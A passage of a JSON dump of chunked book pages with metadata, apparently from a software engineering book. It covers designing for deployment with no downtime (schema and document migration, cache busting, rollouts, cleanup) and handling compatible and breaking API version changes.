      "start_page": 256,
      "end_page": 265,
      "detection_method": "topic_boundary",
      "content": "Chapter 13. Design for Deployment • 252\n\nDBA actions, schema changes, and application changes. Absolutely do not rely on what the application currently says is legal! Sure, every new user has to pick three security questions about pets, cars, and sports teams. But you still have some user records from the days before you adopted those questions. There’ll be people who haven’t logged in for a decade and have a bunch of NULLs for fields you require now. In other words, there’ll be data that abso- lutely cannot be produced by your application as it exists today. That’s why you must test on copies of real production data.\n\nThat’s all well and good for the stodgy old relational databases (twentieth- century technology!). What about the shiny post-SQL databases?\n\nSchemaless Databases\n\nIf you’re using something other than a relational database, then you’re done. There’s absolutely no work you need to do for deployments.\n\nJust kidding!\n\nA schemaless database is only schemaless as far as the database engine cares. Your application is another story entirely. It expects certain structure in the documents, values, or graph nodes returned by your database. Will all the old documents work on the new version of your application? I mean all the old documents, way back to the very first customer record you ever created. Chances are your application has evolved over time, and old versions of those documents might not even be readable now. Harder still, your database may have a patchwork of documents, all created using different application versions, with some that have been loaded, updated, and stored at different points in time. Some of those documents will have turned into time bombs. If you try to read one today, your application will raise an exception and fail to load it. Whatever that document used to be, it effectively no longer exists.\n\nThere are three ways to deal with this. First, write your application so it can read any version ever created. With each new document version, add a new stage to the tail end of a “translation pipeline” like the one shown in the figure on page 253.\n\nIn this example, the top-level reader has detected a document written in ver- sion 2 of the document schema. It needs to be brought up-to-date, which is why the version 2 reader is configured to inject the document into the pipeline via the “version 2 to version 3 translator.” Each translator feeds into the next until the document is completely current. One wrinkle: If the document format has been split at some point in the past, then the pipeline must split as well,\n\nreport erratum • discuss\n\nPhases of Deployment • 253\n\nTranslation Pipeline\n\nV1Reader\n\nV2 Translator\n\nV2Reader\n\nV3 Translator\n\nV3Reader\n\nV4 Translator\n\nVn-1 Reader\n\nVn Translator\n\nVnReader\n\nReader\n\ndetect versionand dispatch\n\nCurrentDoc\n\nas shown in the figure that follows. It must either produce multiple documents in response to the caller, or it must write all the documents back to the database and then reissue the read. The second read will detect the current version and need zero translations.\n\nDoc BV2 Translator\n\nDoc AV1Reader\n\nDoc A V2 Translator\n\nDoc AV2Reader\n\nDoc A V3 Translator\n\nDoc AV3Reader\n\nDoc A V4 Translator\n\nDoc AVn-1 Reader\n\nDoc A Vn Translator\n\nDoc AVnReader\n\nDoc A Reader\n\nCurrentDoc A\n\ndetect versionand dispatch\n\nCurrentDoc\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 254\n\nIf this sounds like a lot of work, it is. All the version permutations must be covered by tests, which means keeping old documents around as seed data for tests. Also, there’s the problem of linearly increasing translation time as the pipeline gets deep.\n\nThe second approach is to write a migration routine that you run across your entire database during deployment. That will work well in the early stages, while your data is still small. Later on, though, that migration will take many minutes to hours. There’s no way you want to take a couple of hours of downtime to let the migration finish. Instead, the application must be able to read the new document version and the old version.\n\nIf both the rollout and the data migration ran concurrently, then four scenarios could occur:\n\n1. An old instance reads an old document. No problem.\n\n2. A new instance reads an old document. No problem.\n\n3. A new instance reads a new document. No problem.\n\n4. An old instance reads a new document. Uh-oh. Big problem.\n\nFor this reason, it would be best to roll out the application version before running the data migration.\n\nThe third major approach is the one I like best. I call it “trickle, then batch.” In this strategy, we don’t apply one massive migration to all documents. Rather, we add some conditional code in the new version that migrates docu- ments as they are touched, as shown in the figure on page 255. This adds a bit of latency to each request, so it basically amortizes the batched migration time across many requests.\n\nWhat about the documents that don’t get touched for a long time? That’s where the batch part comes in. After this has run in production for a while, you’ll find that the most active documents are updated. Now you can run a batch migration on the remainder. It’s safe to run concurrently with produc- tion, because no old instances are around. (After all, the deployment finished days or weeks ago.) Once the batch migration is done, you can even push a new deployment that removes the conditional check for the old version.\n\nThis approach delivers the best of both worlds. It allows rapid rollout of the new application version, without downtime for data migration. It takes advantage of our ability to deploy code without disruption so that we can remove the migration test once it’s no longer needed. The main restriction is that you really shouldn’t have two different, overlapping trickle migrations\n\nreport erratum • discuss\n\nPhases of Deployment • 255\n\nLoad Document\n\nEventReceived\n\nDocumentCurrent?\n\nProcess Event\n\nUpdate Document\n\nSave in New Format\n\nno\n\nyes\n\nSendResponse\n\ngoing against the same document type. That might mean you need to break up some larger design changes into multiple releases.\n\nIt should be evident that “trickle, then batch” isn’t limited to schemaless databases. You can use it for any big migration that would normally take too long to execute during a deployment.\n\nThat takes care of the back-end storage systems. The other issue that com- monly causes us to take downtime is changes in web assets.\n\nWeb Assets\n\nThe database isn’t the only place where versions matter. If your application includes any kind of user interface, then you have other assets to worry about: images, style sheets, and JavaScript files. In today’s applications, front-end asset versions are very tightly coupled to back-end application changes. It’s\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 256\n\nvital to ensure that users receive assets that are compatible with the back- end instance they will interact with. We must address three major concerns: cache-busting, versioning, and session affinity.\n\nStatic assets should always have far-future cache expiration headers. Ten years is a reasonable number. This helps the user, by allowing the user’s browser to cache as much as possible. It helps your system, by reducing redundant requests. But when the time comes to deploy an application change, we actually do need the browser to fetch a new version of the script. “Cache busting” refers to any number of techniques to convince the browser—and all the intermediate proxies and cache servers—to fetch the new hotness.\n\nSome cache busting libraries work by adding a query string to the URL, just enough to show a new version. The server-side application emits HTML that updates the URL from this:\n\n<link rel=\"stylesheet\" href=\"/styles/app.css?v=4bc60406\"/>\n\nto this:\n\n<link rel=\"stylesheet\" href=\"/styles/app.css?v=a5019c6f\"/>\n\nI prefer to just use a git commit SHA for a version identifier. We don’t care too much about the specifics of the version. We just need it to match between the HTML and the asset.\n\n<link rel=\"stylesheet\" href=\"/a5019c6f/styles/app.css\"/> <script src=\"/a5019c6f/js/login.js\"></script>\n\nStatic assets are often served differently than application pages. That’s why I like to incorporate the version number into the URL or the filename instead of into a query string. That allows me to have both the old and new versions sitting in different directories. I can also get a quick view into the contents of a single version, since they’re all under the same top-level directory.\n\nA word of caution: You’ll find advice on the Net to only use version numbers for cache busting, then use rewrite rules to strip out the version portion and have an unadorned path to look up for the actual file. This assumes a big bang deployment and an instantaneous switchover. It won’t work in the kind of deployment we want.\n\nWhat if your application and your assets are coming from the same server? Then you might encounter this issue: The browser gets the main page from an updated instance, but gets load-balanced onto an old instance when it asks for a new asset. The old instance hasn’t been updated yet, so it lacks the new assets. In this situation, you have two options that will both work:\n\nreport erratum • discuss\n\nPhases of Deployment • 257\n\n1. Configure session affinity so that all requests from the same user go to the same server. Anyone stuck on an old app keeps using the old assets. Anyone on the new app gets served the new assets.\n\n2. Deploy all the assets to every host before you begin activating the new code. This does mean you’re not using the “immutable” deployment style, because you have to modify instances that are already running. In general, it’s probably easier to just serve your static assets from a different cluster.\n\nThe preparation phase is finally done. It’s time to turn our attention to the actual rollout of new code.\n\nRollout\n\nThe time has come to roll the new code onto the machines. The exact mechanics of this are going to vary wildly depending on your environment and choice of configuration management tool. Let’s start by considering a “convergence” style infrastructure with long-lived machines that get changes applied to them.\n\nRight away, we have to decide how many machines to update at a time. The goal is zero downtime, so enough machines have to be up and accepting requests to handle demand throughout the process. Obviously that means we can’t update all machines simultaneously. On the flip side, if we do one machine at a time, the rollout may take an unacceptably long time.\n\nInstead, we typically look to update machines in batches. You may choose to divide your machines into equal-sized groups. Suppose we have five groups named Alpha, Bravo, Charlie, Delta, and Foxtrot. Rollout would go like this:\n\n1.\n\nInstruct Alpha to stop accepting new requests.\n\n2. Wait for load to drain from Alpha.\n\n3. Run the configuration management tool to update code and config.\n\n4. Wait for green health checks on all machines in Alpha.\n\n5.\n\nInstruct Alpha to start accepting requests.\n\n6. Repeat the process for Bravo, Charlie, Delta, and Foxtrot.\n\nYour first group should be the “canary” group. Pause there to evaluate the build before moving on to the next group. Use traffic shaping at your load balancer to gradually ramp up traffic to the canary group while watching monitoring for anomalies in metrics. Is there a big spike in errors logged?\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 258\n\nWhat about a marked increase in latency? Or RAM utilization? Better shut traffic off to that group and investigate before continuing the rollout.\n\nTo stop traffic from going to a machine, we could simply remove it from the load balancer pool. That’s pretty abrupt, though, and may needlessly disrupt active requests. I prefer to have a robust health check on the machine.\n\nEvery application and service should include an end-to-end “health check” route. The load balancer can check that route to see if the instance is accepting work. It’s also a useful thing for monitoring and debugging. A good health check page reports the application version, the runtime’s version, the host’s IP address, and the status of connection pools, caches, and circuit breakers.\n\nWith this kind of health check, a simple status change in the application can inform the load balancer not to send any new work to the machine. Existing requests will be allowed to complete. We can use the same flag when starting the service after pushing the code. Often considerable time elapses between when the service starts listening on a socket and when it’s really ready to do work. The service should start with the “available” flag set to false so the load balancer doesn’t send requests prematurely.\n\nIn our example, when the Charlie group is being updated, Alpha and Bravo will be done but Delta and Foxtrot will be waiting. This is the time when all our careful preparation pays off. Both the old and new versions are running at the same time.\n\nLet’s now consider an “immutable” infrastruc- ture. To roll code out here, we don’t change the old machines. Instead we spin up new machines on the new version of the code. Our key decision is whether to spin them up in the existing cluster or to start a new cluster and switch over. If we start them up in the existing cluster, then we have the situation illustrated in the figure. As the new machines come up and get healthy, they will start taking load. This means that you need session stickiness, or else a single caller could bounce back and forth from the old version on differ- ent requests.\n\nIP Addr\n\nreport erratum • discuss\n\nPhases of Deployment • 259\n\nStarting a new cluster is more like the next figure. Here the new machines can be checked for health and well-being before switching the IP address over to the new pool. In this case, we’re less worried about session stickiness, but the moment of switching the IP address may be traumatic to unfinished requests.\n\nIP Addr\n\nWith very frequent deployments, you are better off starting new machines in the existing cluster. That avoids interrupting open connections. It’s also the more palatable choice in a virtualized corporate data center, where the network is not as easy to reconfigure as in a cloud environment.\n\nNo matter how you roll the code out, it’s true under all these models that in- memory session data on the machines will be lost. You must make that transparent to users. In-memory session data should only be a local cache of information available elsewhere. Decouple the process lifetime from the session lifetime.\n\nEvery machine should be on the new code now. Wait a bit and keep an eye on your monitoring. Don’t swing into cleanup mode until you’re sure the new changes are good. Once you’re done with that grace period it’s time to undo some of our temporary changes.\n\nCleanup\n\nI always tell my kids that a job isn’t done until the tools are put away. Way back in the preparation phase (probably ten minutes ago in real time, or eighteen hours by the playbook from last chapter), we applied the database expansions and added shims. The time has come to finish that task.\n\nRemoving shims is the easy part. Once every instance is on the new code, those triggers are no longer necessary, so you can just delete them. Do put the deletion into a new migration, though.\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 260\n\nIt’s also time now to apply another round of schema changes. This is “contrac- tion,” or tightening down the schema:\n\nDrop old tables. • Drop old views. • Drop old columns. • Drop aliases and synonyms that are no longer used. • Drop stored procedures that are no longer called. • Apply NOT NULL constraints on the new columns. • Apply foreign key constraints.\n\nMost of those are pretty obvious. The exceptions are the two kinds of con- straint. We can only add constraints after the rollout. That’s because the old application version wouldn’t know how to satisfy them. Instances running on the old version would start throwing errors on actions that had been just fine. This breaks our principle of undetectability.\n\nIt might be easy for you to split up your schema changes this way. If you use any kind of migrations framework, then you’ll have an easier time of it. A migrations framework keeps every individual change around as a version- controlled asset in the codebase. The framework can automatically apply any change sets that are in the codebase but not in the schema. In contrast, the old style of schema change relied on a modeling tool—or sometimes a DBA acting like a modeling tool—to create the whole schema at once. New revisions in the tool would create a single SQL file to apply all the changes at once. In this world, you can still split the changes into phases, but it requires more effort. You must model the expansions explicitly, version the model, then model the contractions and version it again.\n\nWhether you write migrations by hand or generate them from a tool, the time- ordered sequence of all schema changes is helpful to keep around. It provides a common way to test those changes in every environment.\n\nFor schemaless databases, the cleanup phase is another time to run one- shots. As with the contraction phase for relational databases, this is when you delete documents or keys that are no longer used or remove elements of documents that aren’t needed any more.\n\nThis cleanup phase is also a great time to review your feature toggles. Any new feature toggles should have been set to “off” by default. The cleanup phase is a good time to review them to see what you want to enable. Also take a look at the existing settings. Are there any toggles that you no longer need? Schedule them for removal.\n\nreport erratum • discuss\n\nDeploy Like the Pros • 261\n\nDeploy Like the Pros\n\nIn those old days of the late 2000s, deployment was a completely different concern than design. Developers built their software, delivered a binary and a readme file, and then operations went to work. No longer. Deployments are frequent and should be seamless. The boundary between operations and development has become fractal. We must design our software to be deploy- able, just as we design software for production.\n\nBut great news! This isn’t just an added burden on the already-behind- schedule development team. Designing for deployment gives you the ability to make large changes in small steps.\n\nThis all rests on a foundation of automated action and quality checking. Your build pipeline should be able to apply all the accumulated wisdom of your architects, developers, designers, testers, and DBAs. That goes way beyond running tests during the build. For instance, there’s a common omission that causes hours of downtime: forgetting an index on a foreign key constraint. If you’re not in the relational world, that sentence probably didn’t mean much. If you are in the relational world, it probably made you scrunch up your face and go, “Ooh, ouch.” Why would such an omission reach production? One answer leads to the dark side. If you said, “Because the DBA didn’t check the schema changes,” then you’ve taken a step on that gloomy path.\n\nAnother way to answer is to say, “Because SQL is hard to parse, so our build pipeline can’t catch that.” This answer contains the seeds of the solution. If you start from the premise that your build pipeline should be able to catch all mechanical errors like that, then it’s obvious that you should start speci- fying your schema changes in something other than SQL DDL. Whether you use a home-grown DSL or an off-the-shelf migration library doesn’t matter that much. The main thing is to turn the schema changes into data so the build pipeline has X-ray vision into the schema changes. Then it can reject every build that defines foreign key constraints without an index. Have the humans define the rules. Have the machines enforce them. Sure it sounds like a recipe for a dystopian sci-fi film, but it’ll let your team sleep at night instead of praying to the Polycom.\n\nWrapping Up\n\nTo be successful, your software will be deployed early and often. That means the act of deployment is an essential part of the system’s life. Therefore, it’s worth designing the software to be deployed easily. Zero downtime is the objective.\n\nreport erratum • discuss",
      "page_number": 256,
      "chapter_number": 32,
      "summary": "This chapter covers segment 32 (pages 256-265). Key topics include version, versions, and migrations. Relational Database Schemata\n\nDatabase changes are one of the driving factors behind “planned downtime,” especially schema changes to relational databases.",
      "keywords": [
        "version",
        "application",
        "Deployment",
        "Translator Doc",
        "time",
        "document",
        "n’t",
        "Doc",
        "documents",
        "translator",
        "data",
        "application version",
        "Add",
        "Database",
        "migration"
      ],
      "concepts": [
        "version",
        "versions",
        "migrations",
        "migration",
        "migrates",
        "documents",
        "document",
        "deployment",
        "deployments",
        "time"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 7,
          "title": "Segment 7 (pages 52-61)",
          "relevance_score": 0.74,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 16,
          "title": "Segment 16 (pages 144-152)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "AI Engineering Building Applications",
          "chapter": 26,
          "title": "Segment 26 (pages 518-535)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 8,
          "title": "Segment 8 (pages 62-70)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 33,
      "title": "Segment 33 (pages 266-273)",
      "start_page": 266,
      "end_page": 273,
      "detection_method": "topic_boundary",
      "content": "Chapter 13. Design for Deployment • 262\n\nSmaller, easier deployments mean you can make big changes over a series of small steps. That reduces disruption to your users, whether they are humans or other programs.\n\nSo far, we’ve covered the “interior” view of deployments. This includes struc- turing changes to database schemata and documents, rolling the code to machines, and cleaning up afterward. Now it’s time to look at how your soft- ware fits in with the rest of the ecosystem. Handling protocol versions grace- fully is a key aspect of that, so we’ll tackle it next.\n\nreport erratum • discuss\n\nCHAPTER 14\n\nHandling Versions\n\nWe now know how to design applications so that they can be deployed easily and repeatedly. That means we also have the ability to change the way our software talks with the rest of the world easily and repeatedly. However, as we make changes to add features, we need to be careful not to break consum- ing applications. Whenever we do that, we force other teams to do more work in order to get running again. Something is definitely wrong if our team cre- ates work for several other teams! It’s better for everyone if we do some extra work on our end to maintain compatibility rather than pushing migration costs out onto other teams. This chapter looks at how your software can be a good citizen.\n\nHelp Others Handle Your Versions\n\nIt won’t come as a surprise to learn that different consumers of your service have different goals and needs. Each consuming application has its own development team that operates on its own schedule. If you want others to respect your autonomy, then you must respect theirs. That means you can’t force consumers to match your release schedule. They shouldn’t have to make a new release at the same time as yours just so you can change your API. That is trivially true if you provide SaaS services across the Internet, but it also holds within a single organization or across a partner channel. Trying to coordinate consumer and provider deployments doesn’t scale. Follow the ripple effect from your deployment and you might find that the whole company has to upgrade at once. That means most new versions of a service should be compatible.\n\nNonbreaking API Changes\n\nIn the TCP specification, Jon Postel gave us a good principle for building robust systems from disparate providers. Postel’s robustness principle says,\n\nreport erratum • discuss\n\nChapter 14. Handling Versions • 264\n\n“Be conservative in what you do, be liberal in what you accept from others.”1 It has mostly worked out for the Internet as a whole (subject to a lot of caveats from Chapter 11, Security, on page 215,) so let’s see if we can apply this prin- ciple to protocol versions in our applications.\n\nIn order to make compatible API changes, we need to consider what makes for an incompatible change. What we call an “API” is really a layered stack of agreements between pieces of software. Some of the agreements are so funda- mental now that we barely talk about them. For example, when was the last time you saw a network running NetBIOS instead of TCP/IP? We can assume a certain amount of commonality: IP, TCP, UDP, and DNS. (Multicast may be allowed within some boundaries in your network, but this should only be used within a closed set of hosts. Never expect it to be routed between different net- works.) Above that, we are firmly in “layer 7,” the application layer. The consumer and provider must share a number of additional agreements in order to commu- nicate. We can think of these as agreements in the following situations:\n\nConnection handshaking and duration • Request framing • Content encoding • Message syntax • Message semantics • Authorization and authentication\n\nIf you pick the HTTP family (HTTP, HTTPS, HTTP/2) for connection handshak- ing and duration, then you get some of the other agreements baked in. For example, HTTP’s “Content-Type” and “Content-Length” headers help with request framing. (“Framing” is deciding where, in the incoming stream of bytes, a request begins and ends.) Both parties get to negotiate content encoding in the header of the same name.\n\nIs it enough to specify that your API accepts HTTP? Sadly, no. The HTTP specification is vast. (The HTTP/1.1 specification spans five RFCs: RFC7231 to RFC7235.) How many HTTP client libraries handle a “101 Switching Proto- cols” response? How many distinguish between “Transfer-Encoding” and “Content-Encoding?” When we say our service accepts HTTP or HTTPS, what we usually mean is that it accepts a subset of HTTP, with limitations on the accepted content types and verbs, and responds with a restricted set of status codes and cache control headers. Maybe it allows conditional requests, maybe not. It almost certainly mishandles range requests. In short, the services we build agree to a subset of the standard.\n\n1.\n\nhttps://tools.ietf.org/html/rfc761#section-2.10\n\nreport erratum • discuss\n\nHelp Others Handle Your Versions • 265\n\nWith this view of communication as a stack of layered agreements, it’s easy to see what makes a breaking change: any unilateral break from a prior agreement. We should be able to make a list of changes that would break agreements:\n\nRejecting a network protocol that previously worked • Rejecting request framing or content encoding that previously worked • Rejecting request syntax that previously worked • Rejecting request routing (whether URL or queue) that previously worked • Adding required fields to the request • Forbidding optional information in the request that was allowed before • Removing information from the response that was previously guaranteed • Requiring an increased level of authorization\n\nYou might notice that we handle requests and replies differently. Postel’s Robustness Principle creates that asymmetry. You might also think of it in terms of covariant requests and contravariant responses, or the Liskov sub- stitution principle. We can always accept more than we accepted before, but we cannot accept less or require more. We can always return more than we returned before, but we cannot return less.\n\nThe flip side is that changes that don’t do those things must be safe. In other words, it’s okay to require less than before. It’s okay to accept more optional information than before. And it’s okay to return more than before the change. Another way to think of it is in terms of sets of required and optional param- eters. (Thank you to Rich Hickey, inventor of Clojure, for this perspective.) The following changes are always safe:\n\nRequire a subset of the previously required parameters • Accept a superset of the previously accepted parameters • Return a superset of the previously returned values • Enforce a subset of the previously required constraints on the parameters\n\nIf you have machine-readable specifications for your message formats, you should be able to verify these properties by analyzing the new specification relative to the old spec.\n\nA tough problem arises that we need to address when applying the Robustness Principle, though. There may be a gap between what we say our service accepts and what it really accepts. For instance, suppose a service takes JSON pay- loads with a “url” field. You discover that the input is not validated as a URL, but just received as a string and stored in the database as a string. You want to add some validation to check that the value is a legitimate URL, maybe with a regular expression. Bad news: the service now rejects requests that it previously accepted. That is a breaking change.\n\nreport erratum • discuss\n\nChapter 14. Handling Versions • 266\n\nBut wait a minute! The documentation said to pass in a URL. Anything else is bad input and the behavior is undefined. It could do absolutely anything. The classic definition of “undefined behavior” for a function means it may decide to format your hard drive. It doesn’t matter. As soon as the service went live, its implementation becomes the de facto specification.\n\nIt’s common to find gaps like these between the documented protocol and what the software actually expects. I like to use generative testing techniques to find these gaps before releasing the software. But once the protocol is live, what should you do? Can you tighten up the implementation to match the documentation? No. The Robustness Principle says we have no choice but to keep accepting the input.\n\nA similar situation arises when a caller passes acceptable input but the service does something unexpected with it. Maybe there’s an edge case in your algo- rithm. Maybe someone passed in an empty collection instead of leaving the collection element out of the input. Whatever the cause, some behavior just happens to work. Again, this isn’t part of the specification but an artifact of the implementation. Once again, you aren’t free to change that behavior, even if it was something you never intended to support. Once the service is public, a new version cannot reject requests that would’ve been accepted before. Anything else is a breaking change.\n\nEven with these cautions, you should still publish the message formats via something like Swagger/OpenAPI. That allows other services to consume yours by coding to the specification. It also allows you to apply generated tests that will push the boundaries of the specification. That can help you find those two key classes of gaps: between what your spec says and what you think it says, and between what the spec says and what your implemen- tation does. This is “inbound” testing, as shown in the following figure, where you exercise your API to make sure it does what you think it does.\n\nYourService\n\nTestCases\n\nAPI\n\nThose gaps can be large, even when you think you have a strong specifica- tion. I also recommend running randomized, generative tests against services you consume. Use their specifications but your own tests to see if your\n\nreport erratum • discuss\n\nHelp Others Handle Your Versions • 267\n\nunderstanding of the spec is correct. This is “outbound” testing, in which you exercise your dependencies to make them act the way you think they do.\n\nOne project of mine had a shared data format used by two geographically separated teams. We discussed, negotiated, and documented a specification that we could all support. But we went a step further. As the consuming group, my team wrote FIT tests that illustrated every case in the specification.2 We thought of these as contract tests. That suite ran against the staging system from the other team. Just the act of writing the tests uncovered a huge number of edge cases we hadn’t thought about. When almost 100 percent of the tests failed on their first run, that’s when we really got specific in the spec. Once the tests all passed, we had a lot of confidence in the integration. In fact, our production deployment went very smoothly and we had no oper- ational failures in that integration over the first year. I don’t think it would have worked nearly as well if we’d had the implementing team write the tests.\n\nThis style of test is shown in the figure that follows. Some people call these “contract tests” because they exercise those parts of the provider’s contract that the consumer cares about. As the figure illustrates, such tests are owned by the calling service, so they act as an early warning system if the provider changes.\n\nYourService\n\nTestCases\n\nAPI\n\nSupplier\n\nyourteamotherteam\n\n2.\n\nhttp://fit.c2.com/\n\nreport erratum • discuss\n\nChapter 14. Handling Versions • 268\n\nAfter exhausting all other options, you may still find that a breaking change is required. Next we’ll look at how to help others when you must do something drastic.\n\nBreaking API Changes\n\nNothing else will suffice. A breaking change is on the horizon. There are still things you can do to help consumers of your service.\n\nThe very first prerequisite is to actually put a version number in your request and reply message formats. This is the version number of the format itself, not of your application. Any individual consumer is likely to support only one version at a time, so this is not for the consumer to automatically bridge versions. Instead, this version number helps with debugging when something goes wrong.\n\nUnfortunately, after that easy first step, we step right out into shark-infested waters. We have to do something with the existing API routes and their behavior. Let’s use the following routes from a peer-to-peer lending service (the service that collects a loan application for credit analysis) as a running example. It needs to know some things about the loan and the requester:\n\nRoute\n\nVerb\n\nPurpose\n\n/applications\n\nPOST\n\nCreate a new application\n\n/applications/:id\n\nGET\n\nView the state of a specific application\n\n/applications?q=query- string\n\nGET\n\nSearch for applications that match the query\n\n/borrower\n\nPOST\n\nCreate a new borrower\n\n/borrower/:id\n\nGET\n\nView the state of a borrower\n\n/borrower/:id\n\nPUT\n\nUpdate the state of a borrower\n\nTable 1—Example Routes\n\nThat service is up and running, doing great. It turns out that a successful service needs to be changed more often than a useless one. So, naturally, new requirements come up. For one thing, the representation of the loan request is hopelessly inadequate for more than the original, simple UI. The updated UI needs to display much more information and support multiple languages and currencies. It also turns out that one legal entity can be both a borrower and a lender at different times, but that each one can only operate in certain countries (the ones in which they are incorporated.) So we have breaking changes to deal with in both the data returned with the “/request” routes and a need to replace the “/borrower” routes with something more general.\n\nreport erratum • discuss\n\nHelp Others Handle Your Versions • 269\n\nHTTP gives us several options to deal with these changes. None are beautiful.\n\n1. Add a version discriminator to the URL, either as a prefix or a query parameter. This is the most common approach in practice. Advantages: It’s easy to route to the correct behavior. URLs can be shared, stored, and emailed without requiring any special handling. You can also query your logs to see how many consumers are using each version over time. For the consumer, a quick glance will confirm which version they are using. Disadvantage: Different representations of the same entity seem like dif- ferent resources, which is a big no-no in the REST world.\n\n2. Use the “Accept” header on GET requests to indicate the desired version. Use the “Content-Type” header on PUT and POST to indicate the version being sent. For example, we can define a media type “application/vnd.lendzit.loan- request.v1” and a new media type “application/vnd.lendzit.loan-request.v2” for our versions. If a client fails to specify a desired version, it gets the default (the first nondeprecated version.) Advantage: Clients can upgrade without changing routes because any URLs stored in databases will con- tinue to work. Disadvantages: The URL alone is no longer enough. Generic media types like “application/json” and “text/xml” are no help at all. The client has to know that the special media types exist at all, and what the range of allowed media types are. Some frameworks support routing based on media type with varying degrees of difficulty.\n\n3. Use an application-specific custom header to indicate the desired version. We can define a header like “api-version.” Advantages: Complete flexibility, and it’s orthogonal to the media type and URL. Disadvantages: You’ll need to write routing helpers for your specific framework. This header is another piece of secret knowledge that must be shared with your consumers.\n\n4. For PUT and POST only, add a field in the request body to indicate the intended version. Advantages: No routing needed. Easy to implement. Disadvantage: Doesn’t cover all the cases we need. In the end, I usually opt for putting something in the URL. A couple of benefits outweigh the drawbacks for me. First, the URL by itself is enough. A client doesn’t need any knowledge beyond that. Second, intermediaries like caches, proxies, and load balancers don’t need any special (read: error-prone) configu- ration. Matching on URL patterns is easy and well understood by everyone in operations. Specifying custom headers or having the devices parse media types to direct traffic one way or another is much more likely to break. This is partic- ularly important to me when the next API revision also entails a language or\n\nreport erratum • discuss",
      "page_number": 266,
      "chapter_number": 33,
      "summary": "This chapter covers segment 33 (pages 266-273). Key topics include changes, deployment, and deployments.",
      "keywords": [
        "n’t",
        "schema",
        "versions",
        "API accepts HTTP",
        "report erratum",
        "API",
        "Drop",
        "service",
        "apply",
        "software",
        "previously",
        "Request",
        "version",
        "time",
        "service accepts HTTP"
      ],
      "concepts": [
        "changes",
        "deployment",
        "deployments",
        "request",
        "requests",
        "versions",
        "specification",
        "specifications",
        "consumers",
        "consume"
      ],
      "similar_chapters": [
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 37,
          "title": "Segment 37 (pages 334-341)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 15,
          "title": "Segment 15 (pages 136-143)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 40,
          "title": "Segment 40 (pages 408-418)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 42,
          "title": "Segment 42 (pages 430-440)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 34,
      "title": "Segment 34 (pages 274-281)",
      "start_page": 274,
      "end_page": 281,
      "detection_method": "topic_boundary",
      "content": "Chapter 14. Handling Versions • 270\n\nframework change, where I’d really like to have the new version running on a separate cluster.\n\nNo matter which approach you choose, as the provider, you must support both the old and the new versions for some period of time. When you roll out the new version (with a zero-downtime deployment, of course), both versions should operate side by side. This allows consumers to upgrade as they are able. Be sure to run tests that mix calls to the old API version and the new API version on the same entities. You’ll often find that entities created with the new version cause internal server errors when accessed via the old API.\n\nIf you do put a version in the URLs, be sure to bump all the routes at the same time. Even if just one route has changed, don’t force your consumers to keep track of which version numbers go with which parts of your API.\n\nOnce your service receives a request, it has to process it according to either the old or the new API. I’ll assume that you don’t want to just make a complete copy of all the v1 code to handle v2 requests. Internally, we want to reduce code duplication as much as possible, so long as we can still make future changes. My preference is to handle this in the controller. Methods that handle the new API go directly to the most current version of the business logic. Methods that handle the old API get updated so they convert old objects to the current ones on requests and convert new objects to old ones on responses.\n\nNow you know how to make your service behave like a good citizen. Unfortu- nately, not every service is as well behaved as yours. We need to look at how to handle input from others.\n\nHandle Others’ Versions\n\nWhen receiving requests or messages, your application has no control over the format. None, zip, zero, nada, zilch. No matter how well the service’s expectations are defined, some joker out there will pass you a bogus message. You’re lucky if the message is just missing some required fields. Right now, we’re just going to talk about how to design for version changes. (For a more thoroughly chilling discussion about interface definitions, see Integration Points, on page 33.)\n\nThe same goes for calling out to other services. The other endpoint can start rejecting your requests at any time. After all, they may not observe the same safety rules we just described, so a new deployment could change the set of required parameters or apply new constraints. Always be defensive.\n\nreport erratum • discuss\n\nHandle Others’ Versions • 271\n\nLet’s look at the loan application service again. As a reminder, from Table 1, Example Routes, on page 268, we have some routes to collect a loan application and data about the borrower.\n\nNow suppose a consumer sends a POST to the /applications route. The POST body represents the requester and the loan information. The details of what happens next vary depending on your language and framework. If you’re in an object-oriented language, then each of those routes connects to a method on a controller. In a functional language, they route to functions that close over some state. No matter what, the post request eventually gets dispatched to a function with some arguments. Ultimately the arguments are some kind of data objects that represent the incoming request. To what extent can we expect that the data objects have all the right information in the right fields? About all we can expect is that the fields have the right syntactic type (integer, string, date, and so on), and that’s only if we’re using an automatic mapping library. If you have to handle raw JSON, you don’t even have that guarantee. (Make sure to always wash your hands and clean your work surfaces after handling raw JSON!)\n\nImagine that our loan service has gotten really popular and some banks want in on the action. They’re willing to offer a better rate for borrowers with good credit, but only for loans in certain categories. (One bank in particular wants to avoid mobile homes in Tornado Alley.) So you add a couple of fields. The requester data gets a new numeric field for “creditScore.” The loan data gets a new field for “collateralCategory” and a new allowed value for the “riskAd- justments” list. Sounds good.\n\nHere’s the bad news. A caller may send you all, some, or none of these new fields and values. In some rare cases, you might just respond with a “bad request” status and drop it. Most of the time, however, your function must be able to accept any combination of those fields. What should you do if the loan request includes the collateral category—and it says “mobile home”— but the risk adjustments list is 